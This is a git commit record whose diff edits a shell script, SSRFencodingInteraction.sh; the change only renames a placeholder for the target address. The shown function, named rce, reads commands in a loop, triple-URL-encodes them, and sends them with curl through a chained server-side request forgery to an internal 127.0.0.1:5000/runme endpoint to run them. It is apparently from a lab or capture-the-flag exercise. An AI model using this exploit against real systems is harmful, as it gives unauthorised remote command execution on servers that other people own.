d30205767258099255309ae520936502c2280c5b
sa1t <68617409+laqkracha@users.noreply.github.com>
2024-06-02 21:23:18 -0600

    Update SSRFencodingInteraction.sh

--- SSRFencodingInteraction.sh
+++ SSRFencodingInteraction.sh
@@ -3,7 +3,7 @@ function rce() {
   echo -n "# "; read cmd
   ecmd=$(echo -n $cmd | jq -sRr @uri | jq -sRr @uri | jq -sRr @uri)
   # Modify the following as required:
-  curl -s -o - "http://<TARGET IP>/load?q=http://internal.app.local/load?q=http::////127.0.0.1:5000/runme?x=${ecmd}"
+  curl -s -o - "http://<TARGET_IP>/load?q=http://internal.app.local/load?q=http::////127.0.0.1:5000/runme?x=${ecmd}"
   echo ""
   done
 }
